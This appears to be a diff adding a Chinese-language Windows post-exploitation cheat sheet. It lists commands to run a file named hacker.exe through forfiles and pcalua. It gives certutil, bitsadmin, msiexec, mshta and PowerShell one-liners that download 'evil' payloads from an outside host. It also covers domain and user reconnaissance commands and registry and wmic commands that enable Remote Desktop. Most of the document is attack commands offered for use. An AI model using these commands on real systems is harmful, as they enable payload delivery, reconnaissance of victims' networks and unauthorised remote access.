@@ -1,0 +1,104 @@
+Windows常用命令
+(一)列目录：
+
+      1， forfiles /p c:\Windows
+
+      2， dir
+
+      3， attrib
+
+(二)查看当前路径：
+
+      1， cd
+
+      2， chdir
+
+(三)执行：
+
+      1， forfiles /p c:\windows\system32 /m calc.exe /c C:\tmp\hacker.exe
+
+      2， pcalua.exe -a C:\tmp\hacker.exe
+
+      2， waitfor
+
+(四)远程下载：
+
+      1， certutil -urlcache -split -f https://www.hackjie.com/evil.txt test.exe
+
+      2， bitsadmin /transfer n https://www.hackjie.com/evil.txt C:\Users\Hepta\Desktop\test\evil.exe
+
+      3， msiexec /q /i https://www.hackjie.com/evil.msi
+
+      4， mshta https://www.hackjie.com/evil.hta
+
+      4， powershell (new-object System.Net.WebClient).DownloadFile( 'http://192.168.3.127:8000/1.bat','1.bat')
+
+(五)查询类：
+
+       ipconfig /all               查看本机ip，所在域
+
+       net user                 查看用户列表
+
+       net user /domain            查看域用户
+
+       net group /domain               查看工作组
+
+       net group "domain admins" /domain     查询域管理员用户组
+
+       net config workstation     当前登陆域
+
+       net session        查看当前会话
+
+       net view \\ip        查看某ip共享
+
+       net share          查看SMB共享路径
+
+       net view /domain          查询域列表
+
+       net start              查询当前的服务
+
+       route print             查看路由表
+
+       tasklist             查看进程
+
+       tasklist /V             查看进程-显示对应用户
+
+       tasklist /S ip /U domain\username /P /V         查看远程电脑的进程
+
+       qprocess *             查看进程(类似tasklist)
+
+       qprocess /SERVER:IP         查看远程电脑的进程
+
+       set             查看系统变量
+
+       whoami /all         查看用户权限，信息
+
+       systeminfo        查看系统信息(包含补丁信息，网卡信息等等)
+
+       qwinsta         查看用户登陆情况
+
+       set             查看系统变量
+
+       net accounts        查看本地密码策略
+
+       net accounts /domain  查看域密码策略
+
+       wmic qfe  查看补丁信息
+
+(六)3389开启(环境测试即可)：
+
+2003服务器开启方式：
+
+     1，wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
+
+     2，reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+     
+
+2008服务器或者2012服务器开启方式：
+
+     1， wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1
+
+      2， wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1
+
+      3， reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
